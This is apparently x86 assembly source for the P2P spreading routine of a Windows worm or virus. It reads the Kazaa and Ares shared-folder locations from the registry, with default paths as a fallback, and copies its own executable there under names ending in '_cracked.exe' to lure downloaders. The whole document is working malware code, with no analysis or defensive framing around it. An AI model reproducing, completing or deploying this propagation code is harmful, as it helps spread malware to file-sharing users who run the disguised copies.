.code
p2p_:

jmp _p2pc0de

kazaa_key db "Software\Kazaa\LocalContent\",0
kazaa_valuename db "Dir0",0

ares_key db "Software\Ares\",0
ares_valuename db "Download.Folder",0
reg_handle dd 0
sz_buffer_keyname dd 512
buffer dd 0
Ares_folder db "C:\Program Files\Ares Lite Edition\My Shared Folder",0
kazaafolder db "C:\Program Files\Kazaa\My Shared Folder",0

string0 db "_cracked.exe",0

buffer_name dd 0

_p2pc0de:


push 512
push 0
call dword ptr [ebp+offset AGlobalAllocF]
mov [ebp+offset buffer_name],eax

push 512
push eax
push 0

call dword ptr [ebp+offset AGetModuleFileNameF]

copy_to_buffer:
mov esi,offset Ares_folder
add esi,ebp
mov edi,[ebp+offset buffer]
mov ecx,sizeof Ares_folder
rep movsb
mov ebx,sizeof Ares_folder-1
mov edx,512

call Copying

mov esi,offset kazaafolder
add esi,ebp
mov edi,[ebp+offset buffer]
mov ecx,sizeof kazaafolder
rep movsb
mov ebx,sizeof kazaafolder-1
mov edx,512

call Copying



;--------------------------------------
;----------Ares registery
mov eax,offset reg_handle
add eax,ebp
push eax
push KEY_ALL_ACCESS
push 0
mov eax,offset ares_key
add eax,ebp
push eax
push HKEY_CURRENT_USER
call dword ptr [ebp+offset ARegOpenKeyExF]
or eax,eax
jnz Ares_reg_exit


mov eax,offset sz_buffer_keyname
add eax,ebp
push eax
push [ebp+offset buffer]
push 0
push 0
mov eax,offset ares_valuename
add eax,ebp
push eax
push [ebp+offset reg_handle]
call dword ptr [ebp+offset ARegQueryValueExF]
or eax,eax
jnz Ares_reg_exit

push [ebp+offset reg_handle]
call [ebp+offset ARegCloseKeyF]



 

;-----------------------beginning Ares retrieving shared folder


mov eax,[ebp+offset buffer]
mov ebx,eax
mov ecx,512

_krkt:
push ecx
xor edx,edx
mov dh,byte ptr[eax]
cmp dh,0
je exit_krkt
sub dh,'0'
;inc dh
push eax
mov eax,edx
mov ecx,16
mul ecx
xor ecx,ecx
mov ecx,eax
xor  edx,edx
pop eax
mov dh,byte ptr [eax+1]
cmp dh,'A'
jae another_krkt

sub dh,'0'
;inc dh
jmp localize
another_krkt:
sub dh,'A'
add dh,10
localize:
add ecx,edx
mov byte ptr [ebx],ch
add eax,2
inc ebx

pop ecx

loop _krkt
exit_krkt:

pop eax
mov ecx,512
sub ecx,eax
push ebx

zer0_rest:
mov byte ptr [ebx],0
inc ebx
loop zer0_rest

pop ebx

sub ebx,[ebp+offset buffer]
mov edx,512

call Copying
Ares_reg_exit:



;--------------------------------------
;----------kazaa registery
kazaa_flder_retrieving:

mov eax,offset reg_handle
add eax,ebp
push eax
push KEY_ALL_ACCESS
push 0
mov eax,offset kazaa_key
add eax,ebp
push eax
push HKEY_CURRENT_USER
call dword ptr [ebp+offset ARegOpenKeyExF]
or eax,eax
jnz exit_p2p



mov eax,offset sz_buffer_keyname
add eax,ebp
push eax
push [ebp+offset buffer]
push 0
push 0
mov eax,offset kazaa_valuename
add eax,ebp
push eax
push [ebp+offset reg_handle]
call dword ptr [ebp+offset ARegQueryValueExF]
or eax,eax
jnz exit_p2p




push [ebp+offset reg_handle]
call [ebp+offset ARegCloseKeyF]


;/////////////Kazaa folder

mov eax,[ebp+offset buffer]
mov edx,eax
add edx,512
xor ecx,ecx
krkt_kazaa:
cmp eax,edx
je exit_kazaa_p2p
inc ecx
inc eax
cmp byte ptr [eax],':'
jne krkt_kazaa

mov edx,512
sub edx,ecx
 
inc eax
mov [ebp+offset buffer],eax
xor ecx,ecx
zer0:
cmp eax,edx
je exit_kazaa_p2p
inc ecx
inc eax
cmp byte ptr[eax],0
jne zer0
mov ebx,ecx

call Copying

change_to_first_ten_directories:  ;///theoritically will find 10 of those directories!!
mov eax,offset kazaa_valuename
add eax,ebp
add eax,sizeof kazaa_valuename-2
inc byte ptr [eax]
jmp kazaa_flder_retrieving


exit_kazaa_p2p:


exit_p2p:


ret


Copying:

mov eax,[ebp+offset buffer_name]
add eax,512
mov ecx,edx


loop_exe:
cmp byte ptr [eax],'\'
je next_1
dec eax
loop loop_exe
jmp exit_p2p
next_1:

mov esi,eax
mov edi,[ebp+offset buffer]
add edi,ebx
rep movsb

mov eax,[ebp+offset buffer]
add eax,edx

_dot_exe:
cmp eax,[ebp+offset buffer]
je exit_copying
dec eax
cmp word ptr [eax],'exe'
jne _dot_exe

dec eax

_string0:
mov esi,offset string0
add esi,ebp
mov edi,eax
mov ecx,sizeof string0
rep movsb



push TRUE
push [ebp+offset buffer]
push [ebp+offset buffer_name]
call dword ptr [ebp+offset ACopyFileF]

exit_copying:

ret



